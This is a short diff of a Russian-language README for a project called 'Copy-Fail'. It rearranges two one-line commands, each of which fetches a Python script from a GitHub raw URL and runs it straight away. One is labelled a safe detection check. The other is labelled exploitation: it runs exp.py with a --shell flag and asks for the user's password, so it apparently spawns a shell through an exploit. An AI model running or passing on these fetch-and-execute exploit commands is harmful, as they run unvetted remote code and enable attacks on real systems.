@@ -2,13 +2,18 @@
 
 ## Python 3.7+ совместимая версия (включая Astra Linux)
 
-```bash
-python3 -c "$(curl -s https://raw.githubusercontent.com/p401a-ops/Copy-Fail/refs/heads/main/exp.py)" --shell
-```
+Безопасная провера без эксплуатирования:
 
 ```bash
 curl -s https://raw.githubusercontent.com/p401a-ops/Copy-Fail/refs/heads/main/detect.py | python3
 ```
+
+Эксплуатирование (когда попросит надо ввести пароль пользователя)
+```bash
+python3 -c "$(curl -s https://raw.githubusercontent.com/p401a-ops/Copy-Fail/refs/heads/main/exp.py)" --shell
+```
+
+
 
 ---
 
